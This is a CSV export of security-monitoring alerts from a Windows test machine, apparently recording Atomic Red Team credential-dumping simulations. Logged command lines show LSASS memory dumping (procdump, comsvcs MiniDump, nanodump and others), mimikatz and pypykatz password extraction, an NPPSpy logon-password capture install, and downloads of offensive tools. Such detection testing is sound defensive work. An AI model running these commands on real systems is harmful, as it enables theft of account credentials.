timestamp,agent.name,rule.description,rule.level,rule.id,data.win.eventdata.commandLine,data.win.eventdata.image,data.win.eventdata.parentImage,data.win.system.computer
"Jun 19, 2026 @ 10:40:20.589",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\x64\\mimikatz.exe\\\""\"") {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:40:19.338",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:40:17.100",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 New-Item -Type Directory \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\\\\""\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest \\\""\""https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\\\""\"" -OutFile \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:40:15.797",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:40:14.504",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Outflank-Dumpert.exe\\\""\"") {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:40:11.957",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 New-Item -ItemType Directory (Split-Path \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Outflank-Dumpert.exe\\\""\"") -Force | Out-Null Invoke-WebRequest \\\""\""https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe\\\""\"" -OutFile \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Outflank-Dumpert.exe\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:40:10.746",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Outflank-Dumpert.exe\\\""\"") {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:40:08.696",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe\\\""\"") {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:40:06.042",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 New-Item -Type Directory \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\\\\""\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest \\\""\""https://download.sysinternals.com/files/Procdump.zip\\\""\"" -OutFile \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Procdump.zip\\\""\"" Expand-Archive \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Procdump.zip\\\""\"" \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Procdump\\\""\"" -Force New-Item -ItemType Directory (Split-Path \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe\\\""\"") -Force | Out-Null Copy-Item \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Procdump\\Procdump.exe\\\""\"" \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe\\\""\"" -Force}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:40:04.714",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe\\\""\"") {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:34:24.076",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \""%%temp%%\\SilentProcessExit\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:34:22.159",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {if (Test-Path -Path \\\""\""$env:SystemRoot\\System32\\rdrleakdiag.exe\\\""\"") {       $binary_path = \\\""\""$env:SystemRoot\\System32\\rdrleakdiag.exe\\\""\""   } elseif (Test-Path -Path \\\""\""$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\\\""\"") {       $binary_path = \\\""\""$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\\\""\""   } else {       $binary_path = \\\""\""File not found\\\""\""       exit 1   } $lsass_pid = get-process lsass |select -expand id if (-not (Test-Path -Path\\\""\""$env:TEMP\\t1003.001-13-rdrleakdiag\\\""\"")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force}  write-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 &amp; $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 Write-Host \\\""\""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:34:20.275",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {C:\\Windows\\Temp\\xordump.exe -out C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -x 0x41}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:34:18.286",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {$exePath =  resolve-path \\\""\""$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\\\""\"" &amp; \\\""\""$exePath\\\""\"" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:34:09.626",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe\"" -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:34:06.701",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz\"" live lsa",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:34:06.642",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\x64\\mimikatz.exe\"" \""sekurlsa::minidump %%tmp%%\\lsass.DMP\"" \""sekurlsa::logonpasswords full\"" exit",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:34:05.126",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe -w \""%%temp%%\\nanodump.dmp\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:34:05.125",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Outflank-Dumpert.exe\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:34:03.609",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:34:02.448",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe\"" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:31:51.884",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \""%%temp%%\\SilentProcessExit\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:31:50.291",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {if (Test-Path -Path \\\""\""$env:SystemRoot\\System32\\rdrleakdiag.exe\\\""\"") {       $binary_path = \\\""\""$env:SystemRoot\\System32\\rdrleakdiag.exe\\\""\""   } elseif (Test-Path -Path \\\""\""$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\\\""\"") {       $binary_path = \\\""\""$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\\\""\""   } else {       $binary_path = \\\""\""File not found\\\""\""       exit 1   } $lsass_pid = get-process lsass |select -expand id if (-not (Test-Path -Path\\\""\""$env:TEMP\\t1003.001-13-rdrleakdiag\\\""\"")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force}  write-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 &amp; $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 Write-Host \\\""\""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:31:48.562",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {C:\\Windows\\Temp\\xordump.exe -out C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -x 0x41}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:31:45.429",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {$exePath =  resolve-path \\\""\""$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\\\""\"" &amp; \\\""\""$exePath\\\""\"" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:31:43.711",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz\"" live lsa",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:31:43.708",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe -w \""%%temp%%\\nanodump.dmp\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:31:42.525",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Outflank-Dumpert.exe\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:27:27.193",Win-Victim,Powershell.exe spawned a powershell process which executed a base64 encoded command,12,92057,"\""powershell.exe\"" &amp; {rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM 1&gt;$Null}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:27:25.550",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {rundll32.exe keymgr,KRShowKeyMgr}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:27:22.616",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:27:18.691",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:* C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:* C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:27:12.830",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore) if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id } C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:27:06.118",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {Copy-Item \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\NPPSPY.dll\\\""\"" -Destination \\\""\""C:\\Windows\\System32\\\""\"" $path = Get-ItemProperty -Path \\\""\""HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\\\""\"" -Name PROVIDERORDER $UpdatedValue = $Path.PROVIDERORDER + \\\""\"",NPPSpy\\\""\"" Set-ItemProperty -Path $Path.PSPath -Name \\\""\""PROVIDERORDER\\\""\"" -Value $UpdatedValue $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \\\""\""Class\\\""\"" -Value 2 -ErrorAction Ignore $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \\\""\""Name\\\""\"" -Value NPPSpy -ErrorAction Ignore $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \\\""\""ProviderPath\\\""\"" -PropertyType ExpandString -Value \\\""\""%%SystemRoot%%\\System32\\NPPSPY.dll\\\""\"" -ErrorAction Ignore echo \\\""\""[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:27:04.811",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\gsecdump.exe\"" -a",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:02:53.607",Win-Victim,Suspicious Windows cmd shell execution,3,92032,"findstr  /i \""Image Name:   Secure System\""",C:\\Windows\\System32\\findstr.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:02:53.566",Win-Victim,Suspicious Windows cmd shell execution,3,92032,"tasklist  /FI \""IMAGENAME eq Secure System\"" /v /FO list",C:\\Windows\\System32\\tasklist.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:02:50.654",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""C:\\WINDOWS\\system32\\cmd.exe\"" /d /c C:\\WINDOWS\\system32\\hpatchmonTask.cmd",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\svchost.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:02:50.620",Win-Victim,Application Compatibility Database launched,12,92058,C:\\WINDOWS\\System32\\sdbinst.exe -m -bg,C:\\Windows\\System32\\sdbinst.exe,C:\\Windows\\System32\\svchost.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:02:43.727",Win-Victim,Application Compatibility Database launched,12,92058,"C:\\WINDOWS\\system32\\sdbinst.exe \""C:\\Program Files\\WindowsApps\\Microsoft.ApplicationCompatibilityEnhancements_1.2511.9.0_x64__8wekyb3d8bbwe\\sdb\\sysMergeInboxStoreApp.sdb\""",C:\\Windows\\System32\\sdbinst.exe,C:\\Windows\\System32\\svchost.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:01:52.709",Win-Victim,Suspicious Windows cmd shell execution,3,92032,"findstr  /i \""Image Name:   Secure System\""",C:\\Windows\\System32\\findstr.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:01:52.703",Win-Victim,Suspicious Windows cmd shell execution,3,92032,"tasklist  /FI \""IMAGENAME eq Secure System\"" /v /FO list",C:\\Windows\\System32\\tasklist.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:01:50.572",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""C:\\WINDOWS\\system32\\cmd.exe\"" /d /c C:\\WINDOWS\\system32\\hpatchmonTask.cmd",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\svchost.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:52:04.686",Win-Victim,Powershell.exe spawned a powershell process which executed a base64 encoded command,12,92057,"\""powershell.exe\"" &amp; {rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM 1&gt;$Null}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:52:02.773",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {rundll32.exe keymgr,KRShowKeyMgr}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:52:00.052",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:51:55.738",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:* C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:* C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:51:46.815",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore) if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id } C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:51:41.123",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {Copy-Item \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\NPPSPY.dll\\\""\"" -Destination \\\""\""C:\\Windows\\System32\\\""\"" $path = Get-ItemProperty -Path \\\""\""HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\\\""\"" -Name PROVIDERORDER $UpdatedValue = $Path.PROVIDERORDER + \\\""\"",NPPSpy\\\""\"" Set-ItemProperty -Path $Path.PSPath -Name \\\""\""PROVIDERORDER\\\""\"" -Value $UpdatedValue $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \\\""\""Class\\\""\"" -Value 2 -ErrorAction Ignore $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \\\""\""Name\\\""\"" -Value NPPSpy -ErrorAction Ignore $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \\\""\""ProviderPath\\\""\"" -PropertyType ExpandString -Value \\\""\""%%SystemRoot%%\\System32\\NPPSPY.dll\\\""\"" -ErrorAction Ignore echo \\\""\""[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
